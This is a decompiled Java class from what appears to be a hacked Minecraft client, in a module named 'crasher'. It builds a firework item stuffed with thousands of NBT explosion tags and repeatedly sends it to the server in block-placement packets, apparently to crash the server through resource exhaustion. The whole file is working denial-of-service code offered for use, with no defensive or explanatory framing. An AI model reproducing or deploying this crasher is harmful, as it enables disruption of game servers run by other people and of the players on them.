// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.util.math.BlockPos;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTBase;
import java.util.Arrays;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class PlaceFireworkCrasher
{
    public static void start() {
        final ItemStack firework = new ItemStack(Items.FIREWORKS);
        final NBTTagCompound outerTag = new NBTTagCompound();
        final NBTTagCompound tag2 = new NBTTagCompound();
        final NBTTagList list2 = new NBTTagList();
        final int[] arr = new int[64];
        for (int k = 0; k < 3260; ++k) {
            Arrays.fill(arr, k + 1);
            final NBTTagCompound explosion = new NBTTagCompound();
            explosion.setIntArray("Colors", arr);
            list2.appendTag(explosion);
        }
        tag2.setTag("Explosions", list2);
        tag2.setByte("Flight", (byte)2);
        outerTag.setTag("Fireworks", tag2);
        firework.setTagCompound(outerTag);
        try {
            while (true) {
                Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().player.posX, Minecraft.getMinecraft().player.posY - 2.0, Minecraft.getMinecraft().player.posZ), 1, firework, 0.0f, 0.0f, 0.0f));
                Thread.sleep(100L);
            }
        }
        catch (final InterruptedException i) {}
    }
}
